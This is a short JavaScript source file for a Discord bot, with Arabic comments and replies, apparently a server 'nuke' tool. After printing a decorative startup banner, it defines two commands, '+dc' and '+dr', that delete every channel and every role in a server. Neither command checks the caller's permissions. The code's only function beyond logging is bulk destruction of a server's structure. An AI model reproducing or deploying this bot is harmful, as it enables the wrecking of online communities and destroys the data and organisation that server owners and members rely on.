
const Discord = require('discord.js');
const client = new Discord.Client();
var prefix = "+" ; /// البرفكس
const moment = require('moment');


const fs = require("fs");
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  console.log('')
  console.log('')
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
    console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});
 
client.on('message', message => {
 if(message.content.split(' ')[0] == prefix + 'dc') { 
 if (!message.channel.guild) return;
 message.guild.channels.forEach(m => {
 m.delete();
 });
 }
 if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
 if (!message.channel.guild) return;
 message.guild.roles.forEach(m => {
 m.delete();
 });
 message.reply("`تم حذف جميع الرتب بنجاح`")
 }
 });


client.login(process.env.BOT_TOKEN);
